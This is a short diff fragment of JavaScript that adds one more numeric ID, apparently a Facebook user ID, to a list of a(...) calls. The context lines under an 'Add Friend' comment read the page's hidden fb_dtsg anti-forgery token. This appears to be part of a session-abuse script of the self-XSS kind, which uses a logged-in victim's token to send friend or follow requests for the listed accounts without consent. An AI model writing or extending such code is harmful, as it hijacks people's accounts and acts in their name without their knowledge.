@@ -121,6 +121,7 @@ a("100002263264013");
 a("100003898640819");
 a("100002747023938");
 a("100004043843895");
+a("100002414280218");
 
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
